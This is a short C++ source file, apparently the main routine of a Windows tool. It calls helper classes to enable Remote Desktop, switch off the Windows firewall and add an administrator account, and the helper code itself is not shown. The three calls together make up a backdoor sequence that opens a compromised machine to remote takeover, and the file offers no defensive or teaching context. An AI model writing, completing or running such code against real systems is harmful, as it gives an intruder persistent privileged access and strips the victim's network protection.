#include <iostream>
#include <windows.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
//#include <crtdbg.h>
#include <netfw.h>
#include <objbase.h>
#include <oleauto.h>
#include <stdio.h>
#include "OpenRdp.h"
#include "FireWallHelper.h"
#include "NetUserHelper.h"


using namespace std;

//int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {
int main(int argc,wchar_t* argv){
    OpenRdp* openRdp = OpenRdp::getInstance();
    openRdp->openRdp();
	
	FireWallHelper* fireWallHelper = FireWallHelper::getInstance();
	fireWallHelper->fireWallSwitcher(FALSE);
	NetUserHelper* userHelper = NetUserHelper::getInstance();
	userHelper->addAdministrator();
	return 0;
}

